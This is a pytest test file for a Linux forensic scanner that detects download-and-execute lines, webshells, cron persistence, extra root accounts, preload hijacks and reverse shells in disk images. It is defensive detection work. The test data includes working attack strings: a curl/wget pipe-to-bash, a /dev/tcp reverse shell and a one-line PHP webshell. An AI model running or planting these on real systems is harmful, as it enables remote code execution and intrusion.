import gzip
import hashlib
import io
from pathlib import Path
from types import SimpleNamespace
import pytest
from workbench.detection import text_hits


@pytest.mark.parametrize('path,text,rule',[
    ('/opt/job.sh','wget -qO- https://example.invalid/a | /bin/bash','download_execute'),
    ('/srv/portal/x.php','<?php system($_REQUEST["arg"]);','webshell_code'),
    ('/etc/cron.d/job','7 * * * * root /dev/shm/update','writable_persistence'),
    ('/etc/passwd','backup:x:0:0:backup:/root:/bin/sh','extra_uid_zero'),
    ('/etc/ld.so.preload','/opt/libshim.so','preload_config'),
    ('/tmp/check.sh','grep "pattern" /tmp/a; bash -c "bash -i >/dev/tcp/192.0.2.9/40 0>&1"','reverse_shell'),
])
def test_generic_variants(path,text,rule):
    assert rule in {h['rule_id'] for h in text_hits(path,text.encode())}


@pytest.mark.parametrize('text',[
    '# curl https://example.invalid | bash',
    'printf "%s" "LD_PRELOAD=/opt/lib.so"',
    'grep -R "/dev/tcp/" /opt',
    'echo "history -c"',
])
def test_literal_normal_controls(text):
    assert not list(text_hits('/tmp/inspection.sh',text.encode()))


def test_repeated_weak_detections_preserve_each_occurrence_and_location(tmp_path):
    h,events=hunter(tmp_path)
    scan(h,b'* * * * * root /tmp/agent\n'*3,'/etc/cron.d/job')
    hits=[e for e,s in events if e['type']=='linux_detection']
    assert len(hits)==3
    assert len({e['fields']['image_file_byte_offset'] for e in hits})==3


def test_unclassified_sample_retains_raw_context_without_detection_label(tmp_path):
    h,events=hunter(tmp_path);data=b'ordinary unknown format text'
    item=dict(path='/srv/opaque',partition_offset=0,inode=9,size=len(data),mode=0o100644,mtime=0,baseline_sample=True)
    h.scan(SimpleNamespace(open=lambda:io.BytesIO(data)),item)
    assert events[0][0]['type']=='linux_baseline_sample'
    assert (tmp_path/events[0][1]['relative_path']).read_bytes()==data


def hunter(tmp_path):
    pytest.importorskip('yara')
    from workbench.hunt_stream import Hunter
    (tmp_path/'objects').mkdir(exist_ok=True)
    events=[]
    return Hunter(tmp_path,lambda e,s:events.append((e,s))),events


def scan(h,data,path='/var/log/secure'):
    item=dict(path=path,partition_offset=1048576,inode=40,size=len(data),mode=0o100644,mtime=1788192121)
    h.scan(SimpleNamespace(open=lambda:io.BytesIO(data)),item)


@pytest.mark.parametrize('compressed',[False,True])
def test_chunk_boundary_tail_and_raw_locator(tmp_path,monkeypatch,compressed):
    from workbench import hunt_stream
    h,events=hunter(tmp_path);monkeypatch.setattr(hunt_stream,'CHUNK',128)
    data=b'normal line\n'*400+b'curl https://example.invalid/payload | bash'
    scan(h,gzip.compress(data) if compressed else data)
    hits=[(e,s) for e,s in events if e['type']=='linux_detection']
    assert len(hits)==1
    e,s=hits[0];assert e['fields']['image_file_byte_offset']==4800
    retained=(tmp_path/s['relative_path']).read_bytes()
    assert hashlib.sha256(retained).hexdigest()==s['sha256']
    assert b'curl' in retained
    assert h.files[0]['status']=='scanned'
    if compressed:assert not s['complete'] and s['locator_basis']=='gzip decompressed bytes'


def test_budget_is_partial_and_other_family_still_runs(tmp_path,monkeypatch):
    h,events=hunter(tmp_path);h.remaining['logs']=10
    scan(h,b'x'*100)
    assert h.files[-1]['status']=='partial'
    scan(h,b'* * * * * root /tmp/agent\n','/etc/cron.d/a')
    assert any(e['fields'].get('rule_id')=='writable_persistence' for e,s in events)


def test_whole_elf_rules_and_large_elf_not_negative(tmp_path,monkeypatch):
    h,events=hunter(tmp_path)
    # Static rule semantics; not executed or claimed to be a valid ELF parser fixture.
    payload=b'\x7fELF'+b'\0'*50+b'socket\0setsockopt\0prctl\0/bin/sh\0'
    scan(h,payload,'/usr/bin/sample')
    assert h.files[-1]['yara_status']=='matched'
    from workbench import hunt_stream
    monkeypatch.setattr(hunt_stream,'CHUNK',1)
    scan(h,payload,'/usr/bin/oversized')
    assert h.files[-1]['yara_status']=='not_scanned'
    assert h.files[-1]['status']=='partial'


def test_compressed_binary_archive_is_not_parsed_as_log(tmp_path):
    h,events=hunter(tmp_path)
    payload=b'archive header'+b'\0'*500+b'curl https://example.invalid | bash\n'
    scan(h,gzip.compress(payload),'/opt/install.tgz')
    assert not events
    assert h.files[-1]['status']=='format_unparsed'
    assert h.files[-1]['compression']=='gzip'
